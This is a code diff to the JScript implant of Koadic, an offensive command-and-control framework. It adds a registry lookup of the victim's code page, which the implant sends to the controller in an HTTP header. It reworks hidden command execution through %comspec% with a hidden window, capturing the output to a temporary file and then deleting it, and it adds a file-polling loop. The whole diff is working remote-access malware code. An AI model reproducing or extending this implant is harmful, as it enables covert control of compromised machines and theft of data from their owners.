@@ -305,7 +305,20 @@ Koadic.user.info = function()
     return info;
 }
 //user.info.end
-
+//user.encoder.start
+Koadic.user.encoder = function()
+{
+    try
+    {
+        var encoder = Koadic.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\ACP");
+        return encoder;
+    }
+    catch(e)
+    {
+        return "1252";
+    }
+}
+//user.encoder.end
 Koadic.work = {};
 
 /*
@@ -442,6 +455,8 @@ Koadic.http.addHeaders = function(http, headers)
 
     if (!content)
         http.setRequestHeader("Content-Type", "application/octet-stream");
+
+    http.setRequestHeader("encoder", Koadic.user.encoder())
 }
 
 Koadic.http.post = function(url, data, headers)
@@ -490,15 +505,6 @@ Koadic.http.upload = function(filepath, header_uuid, header_key)
 
     var headers = {};
     headers[key] = header_uuid;
-    try
-    {
-        headers["encoder"] = Koadic.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\ACP");
-    }
-    catch (e)
-    {
-        headers["encoder"] = "1252";
-    }
-
 
     return Koadic.work.report(data, headers);
 }
@@ -791,10 +797,11 @@ Koadic.shell = {};
 //shell.exec.start
 Koadic.shell.exec = function(cmd, stdOutPath)
 {
+    cmd = "chcp " + Koadic.user.encoder() + " & " + cmd;
     var c = "%comspec% /q /c " + cmd + " 1> " + Koadic.file.getPath(stdOutPath);
     c += " 2>&1";
     Koadic.WS.Run(c, 0, true);
-    var data = Koadic.file.readText(stdOutPath);
+    var data = Koadic.file.readBinary(stdOutPath);
     Koadic.file.deleteFile(stdOutPath);
 
     return data;
@@ -832,7 +839,6 @@ Koadic.file.get32BitFolder = function()
 //file.readText.start
 Koadic.file.readText = function(path)
 {
-
     var loopcount = 0;
     while(true)
     {
@@ -858,11 +864,27 @@ Koadic.file.readText = function(path)
 //file.readBinary.start
 Koadic.file.readBinary = function(path)
 {
-    var fp = Koadic.FS.GetFile(Koadic.file.getPath(path));
-    var fd = fp.OpenAsTextStream();
-    var data = fd.read(fp.Size);
-    fd.close();
-    return data;
+    var loopcount = 0;
+    while(true)
+    {
+        if (Koadic.FS.FileExists(Koadic.file.getPath(path)) && Koadic.FS.GetFile(Koadic.file.getPath(path)).Size > 0)
+        {
+            var fp = Koadic.FS.GetFile(Koadic.file.getPath(path));
+            var fd = fp.OpenAsTextStream();
+            var data = fd.read(fp.Size);
+            fd.close();
+            return data;
+        }
+        else
+        {
+            loopcount += 1;
+            if (loopcount > 180)
+            {
+                return "";
+            }
+            Koadic.shell.run("ping 127.0.0.1 -n 2", false);
+        }
+    }
 }
 //file.readBinary.end
 //file.write.start
